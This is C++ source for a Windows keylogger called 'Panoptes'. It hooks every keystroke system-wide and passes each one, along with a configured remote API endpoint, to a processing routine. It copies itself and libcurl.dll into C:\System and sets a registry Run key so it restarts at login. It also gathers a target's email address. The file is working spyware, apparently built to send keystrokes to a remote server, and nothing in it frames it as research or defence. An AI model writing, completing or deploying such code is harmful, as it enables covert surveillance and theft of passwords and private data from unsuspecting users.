#include <iostream>
#include <Windows.h>
#include <stdlib.h>
#include <fstream>
#include <filesystem>

#include "process_key_evt.hpp"
#include "registry_key_actions.hpp"
#include "config.hpp"
#include "grab_target_email_addr.hpp"
#include "observer.hpp"

namespace fs = std::filesystem;

struct dirs_origin_target {
	fs::path src, dest, exec_name;
};

struct KeyboardProcData {
	std::string api_endpoint_url;
	std::vector<std::wstring> subkey_names;
};

KeyboardProcData global;

static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
		DWORD virtual_key_code = kbdStruct->vkCode;
		bool is_key_down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
		process_key_evt(virtual_key_code, is_key_down, global.api_endpoint_url, global.subkey_names);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static std::optional<fs::path> self_clone(const std::string& exec_name, const std::string& dll_name) {
    dirs_origin_target dot;

    dot.src = fs::current_path() / exec_name;
    fs::path src_dll = fs::current_path() / dll_name;

    dot.dest = "C:\\System\\" / fs::path(exec_name);
    fs::path dest_dll = "C:\\System\\" / fs::path(dll_name);

    try {
        fs::create_directories(dot.dest.parent_path());
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Failed to create directory: " << e.what() << std::endl;
        return std::nullopt;
    }

    if (!fs::exists(dot.dest) || fs::last_write_time(dot.src) > fs::last_write_time(dot.dest)) {
        try {
            fs::copy_file(dot.src, dot.dest, fs::copy_options::overwrite_existing);
            std::cout << dot.src << " copied to " << dot.dest << std::endl;
        }
        catch (const fs::filesystem_error& e) {
            std::cerr << "Failed to copy file: " << e.what() << std::endl;
            return std::nullopt;
        }
    }

    if (!fs::exists(dest_dll) || fs::last_write_time(src_dll) > fs::last_write_time(dest_dll)) {
        try {
            fs::copy_file(src_dll, dest_dll, fs::copy_options::overwrite_existing);
            std::cout << src_dll << " copied to " << dest_dll << std::endl;
        }
        catch (const fs::filesystem_error& e) {
            std::cerr << "Failed to copy DLL: " << e.what() << std::endl;
        }
    }

    return dot.dest;
}

int main() {
	registry_key_params reg_params = {
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		"Panoptes.exe",
		"C:\\System\\Panoptes.exe"
	};

	global.api_endpoint_url = config();
	global.subkey_names = grab_target_email_addr();
	
	std::optional<fs::path> dest = self_clone(reg_params.name, "libcurl.dll");
	if (dest.has_value()) {
		reg_params.value = dest->string();
	}
	
	set_registry_key(reg_params);

	HHOOK h_Hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}

	UnhookWindowsHookEx(h_Hook);
	return 0;
} 
